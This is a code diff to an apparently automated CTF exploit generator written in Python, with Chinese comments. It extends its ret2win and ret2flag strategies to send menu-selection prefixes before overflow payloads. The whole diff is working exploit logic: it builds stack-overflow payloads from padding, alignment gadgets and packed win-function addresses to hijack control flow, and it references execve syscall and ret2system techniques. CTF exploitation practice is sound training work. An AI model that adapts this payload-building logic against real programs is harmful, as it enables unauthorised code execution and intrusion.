@@ -146,13 +146,16 @@ def s_ret2win(ch: Challenge, f: Facts) -> Iterable[Plan]:
     win = f.shell_win
     if win is None or ch.elf.pie:
         return
+    menu = _prelude_variants(f)
     for off, sink in _offsets(ch, f):
         for pre in _presets(ch, f):
             for align in ((False, True) if ch.elf.bits == 64 else (False,)):
                 payload = _pad(ch, off) + _align(ch, f, align) + ch.p64(win.addr) + _term(sink)
-                sends = [pre] if pre else []
-                yield Plan("ret2win", sends + [payload],
-                           f"jump to {win.evidence} @ {hex(win.addr)} off={off} align={int(align)}")
+                for m in menu:
+                    sends = ([m] if m else []) + ([pre] if pre else [])
+                    yield Plan("ret2win", sends + [payload],
+                               f"jump to {win.evidence} @ {hex(win.addr)} off={off} "
+                               f"align={int(align)}" + (f" menu={m!r}" if m else ""))
 
 
 # --------------------------------------------------------------------------- 0. 纯 int 0x80（无 libc）
@@ -250,6 +253,20 @@ def s_syscall_execve(ch: Challenge, f: Facts) -> Iterable[Plan]:
 
 
 # --------------------------------------------------------------------------- 0c. PIE + 无泄漏 -> 部分覆盖返回地址
+def _prelude_variants(f: Facts) -> list:
+    """菜单式程序需要先发选择字符（'w\\n'）才进得去漏洞函数。
+
+    返回候选前缀列表；没有菜单的题返回 [b""]。
+    """
+    seen, out = set(), []
+    for prefs in (getattr(f, "interact", {}) or {}).values():
+        for p in prefs:
+            if p not in seen:
+                seen.add(p)
+                out.append(p)
+    return out or [b""]
+
+
 def _gate_offsets(f: Facts, v) -> list:
     """把 `cmp dword ptr [rbp-X], imm` 换算成「缓冲区里的偏移」。"""
     out = []
@@ -336,11 +353,17 @@ def s_ret2win_flag(ch: Challenge, f: Facts) -> Iterable[Plan]:
     for w in f.wins:
         if w.kind != "flag":
             continue
+        targets = [w.addr] + ([w.alt] if getattr(w, "alt", 0) else [])
+        menu = _prelude_variants(f)
         for off, sink in _offsets(ch, f):
             for align in ((False, True) if ch.elf.bits == 64 else (False,)):
-                payload = _pad(ch, off) + _align(ch, f, align) + ch.p64(w.addr) + _term(sink)
-                yield Plan("ret2flag", [payload],
-                           f"jump to {w.evidence} @ {hex(w.addr)} off={off}", tag="flag")
+                for tgt in targets:
+                    payload = _pad(ch, off) + _align(ch, f, align) + ch.p64(tgt) + _term(sink)
+                    for m in menu:
+                        sends = ([m] if m else []) + [payload]
+                        yield Plan("ret2flag", sends,
+                                   f"jump to {w.evidence} @ {hex(tgt)} off={off} align={int(align)}"
+                                   + (f" menu={m!r}" if m else ""), tag="flag")
 
 
 # --------------------------------------------------------------------------- 2. ret2system@plt
